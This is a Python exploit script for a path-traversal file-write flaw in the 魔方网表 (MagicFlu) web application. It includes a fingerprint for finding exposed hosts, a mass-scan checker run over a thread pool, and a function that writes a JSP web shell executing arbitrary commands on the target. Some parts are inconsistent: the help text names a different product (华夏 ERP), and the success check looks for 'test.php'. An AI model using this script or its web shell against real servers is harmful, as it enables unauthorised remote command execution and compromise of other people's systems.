"""
介绍：魔方网表存在文件上传漏洞
指纹：icon_hash="694014318"
"""
import argparse
import textwrap
from multiprocessing.dummy import Pool

import requests
from urllib3.exceptions import InsecureRequestWarning


def check(target, timeout=5):
    # 禁用 SSL 警告信息
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'close',
        }
        url = target + '/magicflu/html/mail/mailupdate.jsp?messageid=/../../../test3.jsp&messagecontent=test123'

        response = requests.get(url, headers=headers, verify=False, timeout=timeout)
        urls = target + '/magicflu/test3.jsp'
        responses = requests.get(urls, headers=headers, verify=False, timeout=timeout)

        if responses.status_code == 200 and 'test123' in response.text:
            print('[*]存在漏洞' + urls)
        else:
            print('[-]不存在漏洞' + target)
    except TimeoutError:
        print(f"请求超时{target}")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")


def getexp(target, timeout=5):
    # 禁用 SSL 警告信息
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
        }
        url = target + '/magicflu/html/mail/mailupdate.jsp?messageid=/../../../test3.jsp'''
        data = '''<%@ page import="java.io.*,java.util.*,java.net.*" %>
<%
    String command = request.getParameter("{cmd}");
    if (command != null && !command.trim().isEmpty()) {
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        reader.close();
    }
%>'''
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=timeout)
        if response.status_code == 200 and 'test.php' in response.text:
            print('[*]成功写入webshell' + url + 'test.php，密码cdm')
        else:
            print('[-]写入失败' + url)
    except TimeoutError:
        print(f"请求超时{target}")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")


def main():
    banner = """
                    ) (`-.            ) (`-.              
             ( OO ).           ( OO ).            
            (_/.  \_)-. ,-.-')(_/.  \_)-. ,-.-')  
             \  `.'  /  |  |OO)\  `.'  /  |  |OO) 
              \     /\  |  |  \ \     /\  |  |  \ 
               \   \ |  |  |(_/  \   \ |  |  |(_/ 
              .'    \_),|  |_.' .'    \_),|  |_.' 
             /  .'.  \(_|  |   /  .'.  \(_|  |    
            '--'   '--' `--'  '--'   '--' `--'    
            """
    print(banner)

    parse = argparse.ArgumentParser(description="华夏 ERPV3.3 信息泄漏漏洞",
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=textwrap.dedent('''example:
        python3 mofang_exp.py.py -u http://xxxx.xxxx.xxxx.xxxx
        python3 mofang_exp.py -f x_url.txt 
        python3 mofang_exp.py -exp 1'''))
    parse.add_argument('-u', '--url', dest='url', type=str, help='添加url信息')
    parse.add_argument('-f', '--file', dest='file', type=str, help='添加txt文件')
    parse.add_argument('-exp', '--exp', dest='exp', type=str, help='写入webshell')
    args = parse.parse_args()
    pool = Pool(20)
    if args.exp:
        getexp(args.url)
    elif args.url:
        check(args.url)
    else:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f'http://{target}'
                targets.append(target)
        pool.map(check, targets)
        pool.close()


if __name__ == '__main__':
    main()